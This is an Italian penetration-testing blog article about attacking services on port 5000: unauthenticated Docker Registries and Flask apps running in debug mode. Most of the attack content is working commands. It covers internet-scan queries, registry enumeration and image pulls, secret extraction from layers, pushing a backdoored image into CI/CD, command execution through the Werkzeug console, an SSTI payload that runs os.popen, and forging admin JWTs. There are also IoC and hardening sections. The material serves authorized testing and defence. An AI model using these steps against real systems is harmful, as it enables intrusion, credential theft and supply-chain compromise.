---
title: 'Porta 5000 Docker Registry e Flask: Debug, RCE e Secret Leak'
slug: porta-5000-docker-flask
description: >-
  Porta 5000 nel pentest: Docker Registry esposto con immagini e segreti
  scaricabili, oppure Flask debug con console Werkzeug e RCE dal browser.
image: /porta-5000-docker-flask.webp
draft: false
date: 2026-04-14T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - Docker Registry
  - Flask Debug
  - Werkzeug Console
---

La port 5000 TCP è condivisa da due servizi completamente diversi ma entrambi devastanti in un pentest: il **Docker Registry** (il repository privato per le immagini Docker) e **Flask** (il microframework web Python in modalità sviluppo). Nel Docker Registry trovi le immagini dei container con tutto ciò che contengono — credenziali, chiavi SSH, token, codice sorgente. In Flask debug mode trovi la **Werkzeug debug console** — una shell Python interattiva direttamente dal browser, senza autenticazione. Due scenari, un'unica porta, e in entrambi i casi il risultato è lo stesso: accesso completo.

Il Docker Registry è il target che preferisco trovare: ogni immagine Docker è un filesystem completo dell'applicazione — l'equivalente di avere accesso al server prima ancora che venga acceso. File di configurazione, variabili d'ambiente, certificati TLS, chiavi private, password hardcoded. Tutto impacchettato in layer scaricabili.

In un assessment per una startup SaaS, ho trovato il Docker Registry sulla 5000 senza auth. Ho pullato l'immagine `backend-api:latest` — nel file `.env` c'erano le API key di Stripe (pagamenti), le credenziali [MongoDB](https://hackita.it/articoli/porta-27017-mongodb) di produzione e la chiave JWT segreta. Con la chiave JWT ho forgiato un token admin e ho avuto accesso completo all'applicazione — senza mai interagire con il sito web.

## Cos'è la Porta 5000?

La porta 5000 TCP è la porta di default per due servizi distinti: il **Docker Registry** v2 (repository privato per immagini container) e il server di sviluppo **Flask/Werkzeug** (framework web Python). Nel contesto di un penetration test, entrambi i servizi espongono dati sensibili o funzionalità di code execution se accessibili senza autenticazione — il Docker Registry permette il download di immagini contenenti credenziali, e Flask in debug mode offre una console Python interattiva.

> **La porta 5000 è pericolosa?**
> Sì, in entrambi gli scenari. Un Docker Registry senza auth espone tutte le immagini container con credenziali, chiavi e codice sorgente. Flask in debug mode espone la **Werkzeug console** con RCE diretto come l'utente del processo. L'impatto è **credential exposure** (Registry) o **Remote Code Execution** (Flask debug).

## Come Verificare se il Servizio È Esposto su Internet

```bash
# Shodan — Docker Registry
port:5000 "docker-distribution" 
port:5000 "Docker-Distribution-Api-Version"

# Shodan — Flask debug
port:5000 "Werkzeug" 

# Censys
services.port=5000 AND services.http.response.headers.server:"Werkzeug"
services.port=5000 AND services.http.response.headers:"Docker-Distribution-Api-Version"

# ZoomEye
port:5000 +"Docker-Distribution"
port:5000 +"Werkzeug"
```

Un Docker Registry esposto su Internet permette a chiunque di scaricare le immagini container dell'azienda — con tutto ciò che contengono. Un Flask in debug mode esposto è una shell Python accessibile dal browser. Shodan ne indicizza centinaia di entrambi i tipi, molti completamente aperti.

## 1. Identificazione — Docker Registry o Flask?

```bash
# Test Docker Registry
curl -s http://10.10.10.40:5000/v2/ -I
```

```
HTTP/1.1 200 OK
Docker-Distribution-Api-Version: registry/2.0
```

Header `Docker-Distribution-Api-Version` → è un Docker Registry.

```bash
# Test Flask
curl -s http://10.10.10.40:5000/ -I
```

```
HTTP/1.1 200 OK
Server: Werkzeug/2.3.7 Python/3.11.6
```

Header `Werkzeug` → è Flask.

## PARTE 1: Docker Registry

### Enumerazione immagini

```bash
# Lista repository (immagini)
curl -s http://10.10.10.40:5000/v2/_catalog
```

```json
{"repositories":["backend-api","frontend-app","worker-service","nginx-custom","db-migration"]}
```

Cinque immagini — l'intera applicazione containerizzata.

```bash
# Tag (versioni) di un'immagine
curl -s http://10.10.10.40:5000/v2/backend-api/tags/list
```

```json
{"name":"backend-api","tags":["latest","v2.3.1","v2.3.0","v2.2.0","staging"]}
```

### Download e analisi immagine

```bash
# Pull diretto (se Docker è installato)
docker pull 10.10.10.40:5000/backend-api:latest

# Analizza il filesystem
docker save 10.10.10.40:5000/backend-api:latest -o backend.tar
mkdir /tmp/image && tar xf backend.tar -C /tmp/image/

# Cerca credenziali nei layer
find /tmp/image/ -name "*.tar" -exec tar tf {} \; | grep -iE "\.env|config|secret|key|password|credential"

# Estrai e cerca
for layer in /tmp/image/*/layer.tar; do
    tar xf "$layer" -C /tmp/extracted/ 2>/dev/null
done
grep -rn "password\|secret\|key\|token\|jdbc\|mongodb" /tmp/extracted/ 2>/dev/null | head -50
```

### Cosa trovo nelle immagini Docker

| File/Path               | Contenuto tipico                    |
| ----------------------- | ----------------------------------- |
| `.env`                  | Credenziali DB, API key, JWT secret |
| `config/*.yml`          | Connection string, SMTP creds       |
| `/root/.ssh/id_rsa`     | Chiave SSH privata                  |
| `/app/settings.py`      | Django SECRET\_KEY, database creds  |
| `docker-entrypoint.sh`  | Password passate come argomento     |
| `/etc/ssl/private/`     | Certificati TLS e chiavi private    |
| `Dockerfile` (in layer) | ARG/ENV con segreti                 |

### Manifest e layer senza Docker

```bash
# Scarica il manifest
curl -s http://10.10.10.40:5000/v2/backend-api/manifests/latest | python3 -m json.tool

# Scarica un singolo layer (blob)
curl -s http://10.10.10.40:5000/v2/backend-api/blobs/sha256:abc123... -o layer.tar.gz
tar xzf layer.tar.gz -C /tmp/layer/
grep -rn "password\|secret" /tmp/layer/
```

### History dell'immagine (comandi Dockerfile)

```bash
# Mostra la history dei layer (Dockerfile ricostruito)
curl -s http://10.10.10.40:5000/v2/backend-api/manifests/latest \
  -H "Accept: application/vnd.docker.distribution.manifest.v1+json" | \
  python3 -c "import sys,json;[print(json.loads(h['v1Compatibility'])['container_config']['Cmd']) for h in json.load(sys.stdin)['history']]"
```

Rivela ogni comando del Dockerfile — inclusi `ENV PASSWORD=...` o `COPY secrets/ /app/`.

### Push immagine malevola (se hai accesso write)

```bash
# Tagga un'immagine con backdoor
docker tag my-backdoor:latest 10.10.10.40:5000/backend-api:latest
docker push 10.10.10.40:5000/backend-api:latest
```

Se il CI/CD fa pull automatico dell'immagine `latest` → la tua backdoor viene deployata in produzione.

## PARTE 2: Flask Debug Mode

### Werkzeug Debug Console

Se Flask gira con `debug=True` (o `FLASK_DEBUG=1`):

```bash
# Verifica debug mode
curl -s http://10.10.10.40:5000/ -v 2>&1 | grep -i "debugger\|werkzeug"

# La console è su /console
curl -s http://10.10.10.40:5000/console
```

Se la pagina mostra un prompt Python interattivo → **RCE diretto**.

### Code execution

```python
# Nel browser: http://10.10.10.40:5000/console
>>> import os
>>> os.popen("id").read()
'uid=1000(flask) gid=1000(flask) groups=1000(flask)\n'
>>> os.popen("cat /etc/passwd").read()
```

### Se c'è un PIN

Nelle versioni recenti di Werkzeug, la console richiede un PIN. Ma il PIN è calcolato deterministicamente da:

* MAC address della macchina
* Username dell'utente
* Path del modulo `app.py`
* Machine-id (`/etc/machine-id`)

Se hai LFI o altra info disclosure → puoi calcolare il PIN:

```python
# Script per calcolare il PIN Werkzeug
import hashlib, itertools

machine_id = open("/etc/machine-id").read().strip()
mac = "02:42:ac:11:00:02"  # da /sys/class/net/eth0/address
username = "flask"
modname = "flask.app"
appname = "Flask"

# Il calcolo dipende dalla versione di Werkzeug
# Vedi: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html
```

### Flask senza debug — SSTI

Se Flask non è in debug mode ma hai input injection:

```bash
# Test SSTI (Server-Side Template Injection)
curl "http://10.10.10.40:5000/search?q={{7*7}}"
# Se risponde "49" → SSTI confermata

# RCE via SSTI
curl "http://10.10.10.40:5000/search?q={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
```

## 2. Micro Playbook Reale

**Minuto 0-1 → Identifica il servizio**

```bash
curl -s http://TARGET:5000/v2/ -I  # Docker Registry?
curl -s http://TARGET:5000/ -I     # Flask/Werkzeug?
```

**Se Docker Registry (minuto 1-10):**

```bash
curl -s http://TARGET:5000/v2/_catalog           # Lista immagini
docker pull TARGET:5000/IMMAGINE:latest          # Pull
grep -rn "password\|secret" /tmp/extracted/      # Cerca creds
```

**Se Flask debug (minuto 1-3):**

```bash
curl -s http://TARGET:5000/console               # Console Python
# → import os; os.system("id")
```

## 3. Caso Studio Concreto

**Settore:** Startup SaaS, 30 dipendenti, piattaforma B2B.

**Scope:** Pentest esterno.

Scansione Nmap dell'IP pubblico → porta 5000 aperta. Header `Docker-Distribution-Api-Version` → Registry. `_catalog` → 8 immagini: `api-gateway`, `user-service`, `payment-service`, `worker`, `frontend`, `nginx`, `redis-custom`, `db-migration`.

Ho pullato `payment-service:latest`: nel file `.env` c'erano le credenziali Stripe (live key `sk_live_...`), la connection string [MongoDB](https://hackita.it/articoli/porta-27017-mongodb) (`mongodb://payment_user:P@yM3nt2025!@mongo01:27017/payments`) e il JWT secret. Con il JWT secret ho forgiato un token admin → accesso completo all'API → dati di 15.000 clienti paganti.

Nell'immagine `db-migration` c'era l'intero schema SQL con dati seed — inclusi 3 utenti admin con password in bcrypt (craccate in 10 minuti con [Hashcat](https://hackita.it/articoli/hashcat)).

**Tempo dal primo curl ai dati dei 15K clienti:** 25 minuti. **Root cause:** Docker Registry esposto su Internet senza auth, credenziali hardcoded nelle immagini.

## 4. Errori Comuni Reali Trovati nei Pentest

**1. Docker Registry senza autenticazione**
Il default. La documentazione Docker dice di aggiungere htpasswd o token auth — quasi nessuno lo fa per i registry interni.

**2. Credenziali in `.env` dentro le immagini**
Il `.env` viene copiato nell'immagine con `COPY . /app/`. Anche se lo aggiungi al `.dockerignore` dopo, i layer vecchi lo contengono ancora.

**3. Flask `debug=True` in produzione**
"Lo lascio acceso per vedere gli errori." La Werkzeug console dà RCE. Punto.

**4. `ENV` e `ARG` con segreti nel Dockerfile**
`ENV DB_PASSWORD=secret123` — visibile nella history dell'immagine con `docker inspect` o dal manifest.

**5. Registry esposto su Internet**
La porta 5000 mappata sul firewall "per il deploy dal laptop del CTO". Chiunque nel mondo può pullare tutte le immagini.

**6. Immagini `latest` in produzione**
Se un attaccante fa push di un'immagine `latest` malevola, il prossimo deploy automatico la usa → supply chain attack.

## 5. Indicatori di Compromissione (IoC)

**Docker Registry:**

* **Pull anomali** nei log del registry — IP non riconosciuti che scaricano immagini
* **Push non autorizzati** — nuovi tag o sovrascrittura di `latest` da IP/utenti sconosciuti
* **Richieste `_catalog`** da IP esterni alla rete CI/CD
* **Volume di traffico anomalo** sulla porta 5000 — il download di immagini multi-GB genera traffico visibile

**Flask:**

* **Richieste a `/console`** nei log di accesso — chiunque acceda alla Werkzeug console
* **Processo Python con connessioni anomale** — reverse shell o connessioni a IP esterni
* **`FLASK_DEBUG=1`** nell'environment del processo — `cat /proc/PID/environ`
* **Error page con traceback completo** — se un utente esterno vede stack trace → debug attivo
* **File creati nella directory del progetto** — webshell o script uploadati via console

## 6. Mini Chain Offensiva Reale

```
Docker Registry :5000 → Pull Image → .env Credentials → MongoDB → JWT Secret → Forged Token → Admin API → 15K clienti
```

**Step 1 — Enumera immagini**

```bash
curl -s http://TARGET:5000/v2/_catalog
# → ["payment-service","api-gateway",...]
```

**Step 2 — Pull e analisi**

```bash
docker pull TARGET:5000/payment-service:latest
docker run --rm -it --entrypoint sh TARGET:5000/payment-service:latest
cat .env
# → STRIPE_KEY=sk_live_...
# → MONGO_URI=mongodb://user:pass@host/db
# → JWT_SECRET=super_secret_key_2025
```

**Step 3 — Forge JWT**

```bash
# Con il JWT secret, crea un token admin
python3 -c "
import jwt
token = jwt.encode({'user_id':1,'role':'admin','exp':9999999999}, 'super_secret_key_2025', algorithm='HS256')
print(token)
"
```

**Step 4 — Accesso API come admin**

```bash
curl -s -H "Authorization: Bearer FORGED_TOKEN" http://api.target.com/api/v1/users | head -50
# → dati di 15.000 clienti
```

Dal Docker Registry aperto → credenziali → accesso completo all'applicazione.

## 7. Detection & Hardening

* **Auth sul Registry** — htpasswd, token auth o OAuth2
* **TLS** — registry solo su HTTPS
* **Non esporre il Registry su Internet** — solo rete CI/CD
* **Non hardcodare segreti** nelle immagini — usare Docker secrets, Vault, environment variables a runtime
* **`.dockerignore`** — escludi `.env`, `.git`, chiavi SSH
* **Multi-stage builds** — i segreti del build stage non finiscono nell'immagine finale
* **Flask `debug=False`** in produzione — sempre
* **Content Trust** — firma le immagini Docker
* **Immutable tags** — non permettere sovrascrittura di tag esistenti
* **Scansione immagini** — Trivy, Grype per trovare segreti e vulnerabilità

## 8. Mini FAQ

**Docker Registry ha credenziali di default?**
No — non ha autenticazione di default. È completamente aperto. L'auth (htpasswd, token) deve essere configurata esplicitamente. Lo trovo aperto nel 70%+ dei pentest interni.

**Flask debug mode in produzione è comune?**
Più di quanto dovrebbe: lo trovo in ambienti di staging esposti, in container Docker dove `FLASK_DEBUG=1` è nell'environment, e in applicazioni dove lo sviluppatore "voleva vedere gli errori". La Werkzeug console è RCE con interfaccia grafica.

**Come trovo segreti nelle immagini Docker senza pullarle?**
Scarica il manifest (`/v2/REPO/manifests/TAG`) e i singoli layer (`/v2/REPO/blobs/DIGEST`). I layer sono tar.gz — estraili e cerca credenziali. Tool automatici: `dive` per esplorare layer, `trufflehog` per cercare segreti.

## 9. Cheat Sheet Finale

| Azione        | Comando                                                                                   |
| ------------- | ----------------------------------------------------------------------------------------- |
| Nmap          | `nmap -sV -p 5000 target`                                                                 |
| Identify      | `curl -s http://target:5000/v2/ -I` (Registry) / `curl -s http://target:5000/ -I` (Flask) |
| Catalog       | `curl -s http://target:5000/v2/_catalog`                                                  |
| Tags          | `curl -s http://target:5000/v2/REPO/tags/list`                                            |
| Manifest      | `curl -s http://target:5000/v2/REPO/manifests/TAG`                                        |
| Pull          | `docker pull target:5000/REPO:TAG`                                                        |
| Inspect       | `docker inspect target:5000/REPO:TAG`                                                     |
| History       | `docker history target:5000/REPO:TAG --no-trunc`                                          |
| Cerca creds   | `grep -rn "password\|secret\|key" /extracted/`                                            |
| Flask console | `curl http://target:5000/console`                                                         |
| Flask SSTI    | `curl "http://target:5000/page?q={{7*7}}"`                                                |

***

Riferimento: Docker Registry API v2, Werkzeug debugger docs, OWASP Docker Security, HackTricks. Uso esclusivo in ambienti autorizzati. [https://www.pentestpad.com/port-exploit/port-5000-upnp-docker-registry-custom-apis](https://www.pentestpad.com/port-exploit/port-5000-upnp-docker-registry-custom-apis)

> Le immagini Docker della tua azienda contengono credenziali di produzione scaricabili da chiunque? [Penetration test HackIta](https://hackita.it/servizi) per verificare. Per padroneggiare l'exploitation di container e microservizi: [formazione 1:1](https://hackita.it/servizi).
